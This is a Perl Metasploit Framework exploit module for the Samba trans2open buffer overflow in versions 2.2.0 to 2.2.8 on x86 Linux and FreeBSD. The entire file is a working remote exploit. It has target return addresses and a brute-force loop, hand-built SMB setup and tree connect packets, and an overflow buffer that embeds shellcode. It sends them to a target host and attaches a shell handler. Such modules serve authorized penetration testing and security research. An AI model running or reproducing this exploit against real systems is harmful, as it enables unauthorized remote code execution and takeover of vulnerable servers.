package Msf::Exploit::samba_trans2open;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Samba trans2open Overflow',
    'Version'  => '$Revision: 1.19 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'linux', 'bsd' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The samba port', 139],
                    'SRET', => [0, 'DATA', 'Use specified return address'],
                    'DEBUG' => [0, 'BOOL', 'Enable debugging mode'],
                   },
                
    'Payload' => {
                    'Space'      => 734,
                    'BadChars'  => "\x00",
                 },
    
    'Description'  => qq{
        This exploits the buffer overflow found in Samba versions
        2.2.0 to 2.2.8. This particular module is capable of
        exploiting the bug on x86 Linux and FreeBSD systems.
    },
    'Refs'  =>  [  
                    'http://www.osvdb.org/4469',
		            'http://www.digitaldefense.net/labs/advisories/DDI-1013.txt'
                ],
    'Targets' => [ 
                    ["Linux x86",   0xbffffdfc, 0xbfa00000, 512, "DWDWDDRD"],
                    ["FreeBSD x86", 0xbfbffdfc, 0xbf100000, 512, "RWDWDDDD"],  
                ],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

    my $target = $self->Targets->[$target_idx];

    my $curr_ret;
    
    $self->PrintLine("[*] Starting brute force mode for target ".$target->[0]);
    
    
    if ($self->GetVar('SRET'))
    {
        my $ret = eval($self->GetVar('SRET')) + 0;
        $target->[1] = $target->[2] = $ret;
    }
    
    for ( 
          $curr_ret  = $target->[1]; 
          $curr_ret >= $target->[2];
          $curr_ret -= $target->[3]
        )
    {
        my $Ret = pack("V", $curr_ret);
        my $Wri = pack("V", ($curr_ret - 128));
        my $Dat = "META";
        my $Addr;
        
        foreach (split(//, $target->[4]))
        {
            $Addr .= $Ret if $_ eq "R";
            $Addr .= $Wri if $_ eq "W";
            $Addr .= $Dat if $_ eq "D";
        }
        
        my $s = Msf::Socket->new();

        if (! $s->Tcp($target_host, $target_port, $self->GetVar('CPORT')))
        {
            $self->PrintLine("");
            $self->PrintLine("[*] Error: ". $s->GetError());
            return;
        }

        my $SetupSession = 
        "\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00".
        "\x00\x00";

        my $TreeConnect =
        "\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00".
        "\x64\x00\x00\x00\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e".
        "\x6f\x62\x6f\x64\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";

        $s->Send($SetupSession);
        my $res = $s->Recv(-1, 5);

        $s->Send($TreeConnect);
        $res = $s->Recv(-1, 5);

        my $Overflow =
        "\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
        "\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90";

        $Overflow .=  $shellcode;
        $Overflow .= "A" x 297;
        $Overflow .=  $Addr . ("\x00" x 273);

        $self->PrintLine(sprintf("[*] Trying return address 0x%.8x...", $curr_ret, length($Overflow)));
        
        if ($self->GetVar('DEBUG'))
        {
            print STDERR "[*] Press enter to send overflow string...\n";
            <STDIN>;
        }
        
        $s->Send($Overflow);
        $s->Send("\x00" x 810);

        # handle client side of shellcode
        $self->Handler($s->GetSocket);
        
        # give the payload time to execute
        sleep(5) if ($self->GetVar('SRET'));

        $s->Close();
        undef($s);
    }
    return;
}



